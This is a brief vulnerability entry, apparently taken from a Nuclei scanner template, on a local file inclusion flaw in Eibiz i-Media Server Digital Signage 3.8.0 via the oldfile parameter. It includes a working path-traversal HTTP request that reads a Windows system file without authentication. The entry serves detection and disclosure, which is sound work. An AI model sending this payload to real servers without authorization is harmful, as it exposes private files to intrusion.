# Vulnerability: Eibiz i-Media Server Digital Signage 3.8.0 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`eibiz-lfi.yaml`)

## Description
Eibiz i-Media Server Digital Signage 3.8.0 is vulnerable to local file inclusion. An unauthenticated remote attacker can exploit this to view the contents of files located outside of the server's root directory. The issue can be triggered through the oldfile GET parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/dlibrary/null?oldfile=../../../../../../windows/win.ini&library=null
```

